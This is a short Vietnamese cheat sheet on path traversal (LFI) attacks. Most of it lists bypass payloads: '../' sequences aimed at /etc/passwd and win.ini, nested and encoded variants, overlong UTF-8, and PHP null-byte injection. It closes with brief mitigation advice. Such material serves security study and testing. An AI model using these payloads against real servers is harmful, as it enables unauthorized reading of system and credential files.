# 📁 Directory / Path Traversal (LFI)

## 1. 📌 Tổng quan
Path Traversal (còn gọi là Directory Traversal / File Path Manipulation) cho phép kẻ tấn công đọc các file tùy ý trên máy chủ mà ứng dụng đang chạy, vượt qua thư mục gốc của trang web (Web Root).

---

## 2. 💣 Cheat Sheet & Bypass Techniques

### Basic Traversal:
```text
../../../etc/passwd
..\..\..\windows\win.ini
```

### Absolute Path Bypass (Khi ứng dụng nhận path tuyệt đối):
```text
/etc/passwd
C:\windows\win.ini
```

### Nested / Stripped Traversal Sequences Bypass (Khi app xóa `../` không đệ quy):
```text
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
```

### URL-encoded / Double URL-encoded Bypass:
- `%2e%2e%2f` (`../`)
- `%252e%252e%252f` (Double URL encode)
- `%c0%af` (Overlong UTF-8 Unicode encoding)

### Null Byte Injection (PHP < 5.3.4):
```text
../../../etc/passwd%00.png
```

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. Sử dụng hàm xác thực đường dẫn tuyệt đối (VD: `Path.resolve()` trong Node.js, `os.path.abspath()` trong Python, `realpath()` trong PHP) và so sánh tiền tố với thư mục cơ sở cho phép (Base Directory).
2. Lưu trữ file với tên ngẫu nhiên (UUID) trong cơ sở dữ liệu thay vì dùng trực tiếp tên file người dùng gửi lên.
